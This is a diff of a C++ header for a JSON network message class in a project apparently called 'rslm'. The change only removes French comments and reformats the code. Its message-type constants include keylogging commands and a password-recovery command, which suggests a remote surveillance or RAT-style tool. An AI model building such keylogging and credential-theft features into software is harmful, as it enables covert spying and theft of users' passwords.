@@ -5,44 +5,38 @@
 
 namespace rslm {
 	namespace net {
-		
+
 		using json = nlohmann::json;
 
 		class Message {
 		public:
-			//Identifiants
-			std::string type; //ex: 'file-list-request'
-			std::string senderId; // qui envoie
-			std::string targetId; // qui recois
-			uint32_t  tag = 0; // pour associer/reponse
+			std::string type;
+			std::string senderId;
+			std::string targetId;
+			uint32_t tag = 0;
 			int64_t timestamp = 0;
 
-			//Donnees 
 			json payload;
 
-			//Constructeur
 			Message() = default;
 			explicit Message(const json& j);
 
-			//serialisation
 			json ToJson() const;
 			std::string ToJsonString() const;
 			static Message FromJson(const std::string& jsonStr);
 
-			//Helpers
 			static Message CreateRequest(const std::string& type,
-										const std::string& sender,
-										const std::string& target,
-										const json& data = {});
+				const std::string& sender,
+				const std::string& target,
+				const json& data = {});
 
 			static Message CreateResponse(const Message& request,
-										 const json& data = {});
-			
+				const json& data = {});
+
 			static Message CreateError(const Message& request,
-									  const std::string& error);
+				const std::string& error);
 		};
 
-	// Type de messages predefinis
 		namespace MessageType {
 			constexpr auto HELLO = "hello";
 			constexpr auto HELLO_ACK = "hello_ack";
@@ -74,8 +68,6 @@ namespace rslm {
 			constexpr auto KEYLOG_STOP = "keylog-stop";
 			constexpr auto KEYLOG_DATA = "keylog-data";
 			constexpr auto PASSWD_RECOVER = "passwd-recover";
-
-
 		}
-	}//namespace net
-}//namespace rslm
+	}
+}
